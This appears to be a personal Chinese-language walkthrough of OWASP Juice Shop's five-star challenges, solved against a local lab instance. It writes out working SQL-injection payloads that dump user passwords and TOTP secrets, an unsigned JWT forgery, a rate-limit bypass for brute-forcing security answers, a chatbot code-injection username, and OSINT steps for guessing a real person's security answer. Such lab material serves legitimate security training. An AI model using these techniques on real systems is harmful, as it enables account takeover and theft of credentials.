# juicyshop 五星挑戰


```
https://pwning.owasp-juice.shop/companion-guide/latest/appendix/solutions.html

docker run --rm -p 3000:3000 bkimminich/juice-shop

192.168.50.237:3000
```


## 在官方宣布之前了解代幣銷售







## 將 Bender 的密碼更改為 slurmCl4ssic，無需使用 SQL 注入或忘記密碼


sql 注入後，修改密碼 current參數去掉
```
http://192.168.50.237:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic
```






## 將可愛的跨域小貓貼在我們的送貨箱上

**這題有趣，可以仔細反覆研究!!! **




**在之前使用 ”？” 字符繞過**
```
http://192.168.50.237:3000/redirect?to=https://www.facebook.com?x=https://github.com/juice-shop/juice-shop

必須要有這字串
https://github.com/juice-shop/juice-shop
```

這個跳轉有意思，他會直接抓取整個頁面的response，而不是單純給你一個301






這題的前端路由漏洞，

main.js先搜尋 decodeURIComponent 或是 lastIndexOf ，然後觀察 assets/public/images/JuiceShop_Logo.png
找到ngOnInit()
找到參數 const o = this.route.snapshot.queryParams.testDecal;

所以前端會修改testDecal的參數，最後圖片會去抓取路徑





漏洞
```
http://192.168.50.237:3000/#/deluxe-membership?testDecal=1111111111111

會變成
<image _ngcontent-ove-c110="" x="120" y="450" height="55" href="assets/public/images/1111111111111"></image>





http://192.168.50.237:3000/#/deluxe-membership?testDecal=../../../../redirect?to=https://placekitten.com/g/400/500?x=https://github.com/juice-shop/juice-shop


會變成
<image _ngcontent-ove-c110="" x="120" y="450" height="55" href="assets/public/images/../../../../redirect?to=https://placekitten.com/g/400/500?x=https://github.com/juice-shop/juice-shop"></image>





相當於 遠程加載圖片
<image _ngcontent-ove-c110="" x="120" y="450" height="55" href="http://192.168.50.237:3000/redirect?to=https://placekitten.com/g/400/500?x=https://github.com/juice-shop/juice-shop"></image>

```

**由於你如果隨便找個web URL 都會被相對路徑拼接而失敗，但因為有了redirect頁面的to 參數，我們又可以直接使用web url。**








## Dumpster 在網路上搜尋洩漏的密碼並登入所屬的原始使用者帳戶


請造訪https://stackoverflow.com/questions/tagged/access-log以尋找access-log此流行平台中標記的所有問題

問題清單不應過多，提及熟悉的 URL 路徑可能會立即脫穎而出

StackOverflow 上標記為「存取日誌」的問題
請造訪 https://stackoverflow.com/questions/57061271/less-verbose-access-logs-using-expressjs-morgan 以查找其中果汁店的更多明確 URL 路徑

關於expressjs/morgan配置的問題
點擊日誌文件片段下面提到的 PasteBin 連結（有關更多信息，請參閱https://pastebin.com/4U1V1UjU ）

在https://pastebin.com/4U1V1UjU上搜尋password以尋找可能有助於實現最終挑戰目標的日誌條目

```
current=
0Y8rMnww$*9VFYE%C2%A759-!Fg1L6t&6lB

new=sjss22%@%E2%82%AC55jaJasj!.k

repeat=sjss22%@%E2%82%AC55jaJasj!.k8
```


url decode 


這裡有個小坑，你最好用下方第一個登入封包，他會變成第二個樣子，原因我不清楚，可能是前端會處理。
```
0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB

0Y8rMnww$*9VFYEÂ§59-!Fg1L6t&6lB
```

最後拿去fuzzer 爆破email 。 J12934@juice-sh.op




























## 透過跨網域存取資料造成不必要的資訊洩露

```
 JSONP 的核心概念是使用 <script> 標籤載入外部資源。這意味著 JSONP 的使用者將外部網站的腳本引入到自己的網站中。如果外部網站的腳本受到惡意操控，它可能包含攻擊者的惡意代碼。
```

```
http://192.168.50.237:3000/rest/user/whoami?callback=123
```








## 使用（不存在的）會計師登錄，無需註冊該用戶



```
CREATE TABLE `Users` (
  `id` INTEGER PRIMARY KEY AUTOINCREMENT, 
  `username` VARCHAR(255) DEFAULT '', 
  `email` VARCHAR(255) UNIQUE, 
  `password` VARCHAR(255), 
  `role` VARCHAR(255) DEFAULT 'customer', 
  `deluxeToken` VARCHAR(255) DEFAULT '', 
  `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', 
  `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', 
  `totpSecret` VARCHAR(255) DEFAULT '', 
  `isActive` TINYINT(1) DEFAULT 1, 
  `createdAt` DATETIME NOT NULL, 
  `updatedAt` DATETIME NOT NULL, 
  `deletedAt` DATETIME
)

```


官方payload 
```
' UNION SELECT *
FROM   (SELECT 15                                          AS 'id',
               ''                                          AS 'username',
               'acc0unt4nt@juice-sh.op'                    AS 'email',
               '12345'                                     AS 'password',
               'accounting'                                AS 'role',
               '123'                                       AS 'deluxeToken',
               '1.2.3.4'                                   AS 'lastLoginIp',
               '/assets/public/images/uploads/default.svg' AS 'profileImage',
               ''                                          AS 'totpSecret',
               1                                           AS 'isActive',
               '1999-08-16 14:14:41.644 +00:00'            AS 'createdAt',
               '1999-08-16 14:33:41.930 +00:00'            AS 'updatedAt',
               NULL                                        AS 'deletedAt')--

```

這也可以拿到 token 。
```
' UNION SELECT 1,2,3,4,5,6,7,8,'',10,11,12,13 --  
```








## 檢索從未投入生產的語言文件

osint 
```
https://pwning.owasp-juice.shop/companion-guide/latest/part3/translation.html#_helping_with_translations

https://crowdin.com/project/owasp-juice-shop

https://crowdin.com/project/owasp-juice-shop/tlh-AA

改底線
http://192.168.50.237:3000/assets/i18n/tlh_AA.json
```

## 解決用戶「wurstbrot」的 2FA 挑戰




找到 totpsecret 欄位 金鑰

totpsecret 是一個縮寫，通常指的是"Time-Based One-Time Password Secret"，也被簡稱為 TOTP Secret。這是一種用於實現雙因素身份驗證（2FA）的技術


```
更改有效負載中的其中一個null，希望找到包含 2FA 設定金鑰的欄位：

http://localhost:3000/rest/products/search?q=')) union select null,id,email,password,2fa,null,null,null,null from users-- 產生 一個500錯誤與SequelizeDatabaseError: SQLITE_ERROR: no such column: 2fa.

http://localhost:3000/rest/products/search?q=')) union select null,id,email,password,2fakey,null,null,null,null from users-- 失敗no such column: 2fakey。

http://localhost:3000/rest/products/search?q=')) union select null,id,email,password,2fasecret,null,null,null,null from users-- 失敗no such column: 2fasecret。

http://localhost:3000/rest/products/search?q=')) union select null,id,email,password,totp,null,null,null,null from users -- 也 失敗和no such column: totp。

http://localhost:3000/rest/products/search?q=')) union select null,id,email,password,totpkey,null,null,null,null from users -- 再次 失敗屈服no such column: totpkey。

http://localhost:3000/rest/products/search?q=')) union select null,id,email,password,totpsecret,null,null,null,null from users --終於 成功並200在該專欄存在時做出回應！

在http://localhost:3000/rest/products/search?q=')) union select null,id,email,password,totpsecret,null,null,null,null from users 的回應中 --尋找所有其他使用者已wurstbrot@juice-sh.op設定 的 使用者的條目。"image":"IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH""image":""

使用您最喜歡的 2FA 應用程式（例如 Google Authenticator）建立新條目，而不是IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH手動掃描密鑰中的任何 QR 碼類型。

前往http:localhost:3000/#/loginwurstbrot@juice-sh.op'--並使用 SQL 注入以Username和任意 密碼登入。

您將看到雙重認證輸入畫面，您現在必須在其中輸入 2FA 應用程式上目前顯示的 6 位數代碼。

適用於香腸香腸的 Google 驗證器 2FA 輸入對話框

點擊“登入”後，您已登錄，並且挑戰將被標記為已解決！
```





## 偽造本質上未簽名的 JWT 令牌

好文
```
https://www.cnblogs.com/zpchcbd/p/14800337.html

HEADER:ALGORITHM 
PAYLOAD:DATA
VERIFY SIGNATURE

某些 JWT 的实现，一旦发现alg为none，将不再生成哈希签名，自然不存在校验签名一说，也就是说当alg为none时，后端将不执行签名验证

```

官方說明:
```
以任何使用者身分登入以在標頭中接收有效的 JWT Authorization 。

複製 JWT（即Bearer ` in the `Authorization 標頭之後的所有內容）並對其進行解碼。

在該payload屬性下，將emailJSON 中的屬性變更為jwtn3d@juice-sh.op。

alg將部件中的屬性值header從 變更HS256為none。

編碼header為base64url. 同樣，將 編碼payload 為base64url。base64url 使其 URL 安全，常規 Base64 編碼可能不起作用！

將上面獲得的兩個字串用.（點符號）連接起來，並 .在獲得的字串末尾添加一個。所以，實際上它變成了 base64url(header).base64url(payload).

將後續請求的標頭變更Authorization為擷取的 JWT（在 JWT 中新增Bearer ` as before) and submit the request. Alternatively you can set the `tokencookie 前綴，用於使用該標頭填入任何未來的請求。
```



burpesuite 安裝 json web tokens 可以修改，然後去掉簽名。


















## 您的所有訂單都屬於我們
docker 無法



## 執行遠端程式碼執行，使不太強化的應用程式永遠忙碌
docker 無法




## 透過忘記密碼機制重設 Bjoern 內部帳戶的密碼


試著找出「Bjoern」可能是誰，您應該很快就能找到 OWASP Juice Shop 計畫的負責人以及這本電子書的作者。

請上https://www.facebook.com/bjoern.kimminich即可立即得知他來自德國於特森鎮。

請造訪https://gist.github.com/9045923或 https://pastebin.com/JL5E0RfX查找Bjoern 在1995 年（當時他還是個青少年）用Turbo Pascal 編寫的一個（真正令人驚奇的）遊戲的來源代碼來學習他的電話區號是04122，屬於 Uetersen。這足以證明您確實走在正確的道路上。

http://www.geopostcodes.com/Uetersen會告訴您 Uetersen 的郵遞區號25436。

請造訪http://localhost:3000/#/forgot-password並提供 bjoern@juice-sh.op您的電子郵件。

在隨後出現的表格中，請提供25436您青少年時期的郵遞區號？

輸入新密碼並匹配重複新密碼，然後按一下「更改」以解決此挑戰。

Bjoern 透過使用德國統一前 郵政編碼格式的不常見變體，使他的安全答案變得更加模糊。

請造訪http://www.alte-postleitzahlen.de/uetersen以了解 Uetersen 的舊郵遞區號是W-2082。這也不能作為答案。比約恩使用了寫出的變體：West-2082。

將答案改為您青少年時的郵遞區號？進入West-2082並再次點擊“更改”以最終解決此挑戰。



## 透過忘記密碼機制重置莫蒂的密碼


試著找出「Morty」可能是誰，最終您會發現Morty Smith是最有可能的使用者身份

莫蒂史密斯
請造訪http://rickandmorty.wikia.com/wiki/Morty並瀏覽 「家庭」部分

它告訴你莫蒂有一隻名叫鼻煙的狗，它也曾經一度被稱為雪球。

請造訪http://localhost:3000/#/forgot-password並提供 morty@juice-sh.op您的電子郵件

創建字串的所有突變（包括典型的“leet-speak”變體！）的單字列表snuffles，並snowball 僅使用

小寫 ( a-z)

大寫 ( A-Z)

和數字字元 ( 0-9)

編寫一個腳本來迭代單字列表並向 發送格式正確的請求http://localhost:3000/rest/user/reset-password。速率限制機制將阻止您在 5 分鐘內發送超過 100 個請求，嚴重阻礙您的暴力攻擊。

更改您的腳本，以便它 X-Forwarded-For在每個請求中提供不同的 -header，因為這在確定請求來源時優先於客戶端 IP。

重新運行腳本，您會在某個時候注意到安全問題的答案是5N0wb41L，並且挑戰被標記為已解決。

此時可以隨意取消腳本執行。

📕：如果您不想為這個挑戰編寫自己的腳本，請查看 Juice-shop-mortys-question-brute-force.py ，它由philly-vanilly 在 GitHub 上以 Gist 形式發布 。












## 下載其中一款產品的藍圖，剝奪商店的收入


OWASP 果汁店標誌（3D 列印）產品的描述表明該產品實際上可能有某種藍圖

從http://localhost:3000/public/images/products/3d_keychain.jpg下載產品圖片 並查看其Exif 元數據

3D 列印徽標 Exif 元數據
研究相機模型條目OpenSCAD發現這是一個創建 3D 模型的程序，可與.stl檔案一起使用

由於沒有給出有關藍圖檔案名稱或任何內容的進一步提示，幸運猜測或暴力攻擊是您唯一的選擇

下載http://localhost:3000/assets/public/images/products/JuiceShop.stl 來解決這個挑戰


這題應該是有點腦洞需要打開，一般的extension 都是常見文檔類型的。










## 告知開發團隊其某些憑證所面臨的危險

解決 訪問開發人員忘記的備份文件

package.json.bak此部分下方不僅包含執行時間依賴項，還包含開發依賴項devDependencies。

瀏覽清單devDependencies並研究其中允許軟體供應鏈攻擊的漏洞。

對於本eslint-scope模組，您將在固定版本中了解此類事件3.7.2，例如 https://status.npmjs.org/incidents/dn7c1fgrr7ng或 https://eslint.org/blog/2018/07/postmortem-for-malicious -包發布

上述兩個連結都參考了 GitHub 上該漏洞的原始報告：https ://github.com/eslint/eslint-scope/issues/39

造訪http://localhost:3000/#/contact

https://github.com/eslint/eslint-scope/issues/39在評論中提交您的反饋 以解決此挑戰

## 通知商店有一個深入前端的拼字錯誤冒名頂替者

Angular CLI 預設產生的第 3 方授權列表
http://localhost:3000/3rdpartylicenses.txt以擷取 



冒名
https://www.npmjs.com/package/anuglar2-qrcode

官方
https://www.npmjs.com/package/angular2-qrcode




## 給服務器一些可以咀嚼一段時間的東西

## 永久禁用支援聊天機器人


聊天機器人是使用名為「juicy-chat-bot」的 npm 模組建構的。可以在這裡找到相同的原始碼

透過查看原始程式碼，我們可以確定使用者訊息是在 VM 上下文中透過一個名為process

程式碼中易受攻擊的部分是 此語句，機器人用它來記住使用者名稱。指令 this.factory.run( users.addUser("${token}", "${name}"))相當於 VM 上下文中的 eval 語句。這可以透過在用戶名中包含"和來利用)

如果將使用者名稱設為，則執行的最終語句將是
```
admin"); process=null; users.addUser("1337", "test
```
users.addUser("token", "admin");
process = null;
users.addUser("1337", "test")

因此，處理函數被設定為空，並且機器人進一步嘗試處理用戶的訊息將導致錯誤

## 取得 Web 伺服器上任意本機檔案的讀取權限
